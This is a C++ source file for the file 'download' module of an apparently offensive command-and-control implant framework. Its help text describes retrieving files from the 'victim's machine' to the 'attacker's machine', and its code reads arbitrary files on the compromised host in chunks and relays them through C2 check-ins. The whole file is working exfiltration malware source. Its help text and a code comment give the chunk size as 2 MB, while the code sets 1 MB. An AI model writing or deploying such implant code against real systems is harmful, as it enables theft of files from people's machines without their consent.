#include "Download.hpp"

#include <cstring>

#include "Common.hpp"


using namespace std;


constexpr std::string_view moduleName = "download";
constexpr unsigned long long moduleHash = djb2(moduleName);


#ifdef _WIN32

__declspec(dllexport) Download* DownloadConstructor() 
{
    return new Download();
}

#else

__attribute__((visibility("default"))) Download* DownloadConstructor() 
{
    return new Download();
}

#endif


Download::Download()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleName), moduleHash)
#else
    : ModuleCmd("", moduleHash)
#endif
{
}

Download::~Download()
{
}

std::string Download::getInfo()
{
    std::string info;
#ifdef BUILD_TEAMSERVER
    info += "Download Module:\n";
    info += "Retrieve a file from the victim's machine and save it to the attacker's machine.\n";
    info += "Large files are automatically split into 2MB chunks and transferred over multiple check-ins.\n";
    info += "\nUsage example:\n";
    info += " - download C:\\Temp\\toto.exe /tmp/toto.exe\n";
    info += "\nArguments:\n";
    info += " <sourcePath>    Path to the file on the victim's machine\n";
    info += " <destPath>      Destination path on the attacker's machine\n";
#endif
    return info;
}

int Download::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
    std::vector<std::string> quoteRegroupedCmd = regroupStrings(splitedCmd);

    if (quoteRegroupedCmd.size() == 3)
    {
        string inputFile = quoteRegroupedCmd[1];
        string outputFile = quoteRegroupedCmd[2];

        c2Message.set_instruction(quoteRegroupedCmd[0]);
        c2Message.set_inputfile(inputFile);
        c2Message.set_outputfile(outputFile);
    }
    else
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }

    return 0;
}


#define ERROR_OPEN_FILE 1 
#define ERROR_READ_FILE 2
#define ERROR_FILE_ALREADY_OPEN 3


const size_t CHUNK_SIZE = 1 * 1024 * 1024; // 2MB


int Download::recurringExec(C2Message& c2RetMessage) 
{
    std::vector<char> buffer;
    if( m_input.is_open() ) 
    {
        c2RetMessage.set_instruction(std::to_string(moduleHash));
        c2RetMessage.set_cmd("");
        c2RetMessage.set_outputfile(m_outputfile);

        std::streamsize chunkSize = std::min(CHUNK_SIZE, (size_t)(m_fileSize - m_bytesRead));
        buffer.resize(chunkSize);

        if (m_input.read(buffer.data(), chunkSize)) 
        {
            c2RetMessage.set_data(buffer.data(), chunkSize);
            
            m_bytesRead += chunkSize;
            if(m_bytesRead==m_fileSize)
            {
                c2RetMessage.set_returnvalue("Success");
                m_fileSize=0;
                m_bytesRead=0;
                m_input.close();
            }
            else
            {
                std::string output = std::to_string(m_bytesRead) + "/" + std::to_string(m_fileSize);
                c2RetMessage.set_returnvalue(output);
            }
        }
        else 
        {
            return 0;
        }
        return 1;
    }
    else
    {
        return 0;
    }
}


int Download::process(C2Message &c2Message, C2Message &c2RetMessage)
{
    if(m_input.is_open())
    {
        c2RetMessage.set_errorCode(ERROR_FILE_ALREADY_OPEN);
        return 0;
    }

    c2RetMessage.set_instruction(std::to_string(moduleHash));
    c2RetMessage.set_cmd("");
    c2RetMessage.set_inputfile(c2Message.inputfile());
    c2RetMessage.set_outputfile(c2Message.outputfile());
    m_outputfile = c2Message.outputfile();

    std::string inputFile = c2Message.inputfile();

    m_input = std::ifstream(inputFile, std::ios::binary | std::ios::ate);
    m_bytesRead = 0;
    std::vector<char> buffer;
    if( m_input.is_open() ) 
    {
        m_fileSize = m_input.tellg();
        m_input.seekg(0, std::ios::beg);

        std::streamsize chunkSize = std::min(CHUNK_SIZE, (size_t)(m_fileSize - m_bytesRead));
        buffer.resize(chunkSize);

        if (m_input.read(buffer.data(), chunkSize)) 
        {
            c2RetMessage.set_data(buffer.data(), chunkSize);
            
            m_bytesRead += chunkSize;

            if(m_bytesRead==m_fileSize)
            {
                c2RetMessage.set_args("0");
                c2RetMessage.set_returnvalue("Success");
                m_fileSize=0;
                m_bytesRead=0;
                m_input.close();
            }
            else
            {
                std::string output = std::to_string(m_bytesRead) + "/" + std::to_string(m_fileSize);
                c2RetMessage.set_args("0");
                c2RetMessage.set_returnvalue(output);
            }
        } 
        else 
        {
            c2RetMessage.set_errorCode(ERROR_READ_FILE);
        }
    }
    else
    {
        c2RetMessage.set_errorCode(ERROR_OPEN_FILE);
    }

    return 0;
}


int Download::followUp(const C2Message &c2RetMessage)
{
    // check if there is an error
    if(c2RetMessage.errorCode()==-1)
    {
        std::string args = c2RetMessage.args();
        std::string outputFile = c2RetMessage.outputfile();

        if(args=="0")
        {
            std::ofstream output(outputFile, std::ios::binary | std::ios::trunc);
            const std::string buffer = c2RetMessage.data();
            output << buffer;
            output.close();
        }
        else
        {
            std::ofstream output(outputFile, std::ios::binary | std::ios::app);
            const std::string buffer = c2RetMessage.data();
            output << buffer;
            output.close();
        }
        
    }

    return 0;
}


int Download::errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg)
{
#ifdef BUILD_TEAMSERVER
    int errorCode = c2RetMessage.errorCode();
    if(errorCode>0)
    {
        if(errorCode==ERROR_OPEN_FILE)
            errorMsg = "Failed: Couldn't open file";
        else if(errorCode==ERROR_READ_FILE)
            errorMsg = "Failed: Read file chunk.";
        else if(errorCode==ERROR_FILE_ALREADY_OPEN)
            errorMsg = "Failed: File already open.";        
    }
#endif
    return 0;
}
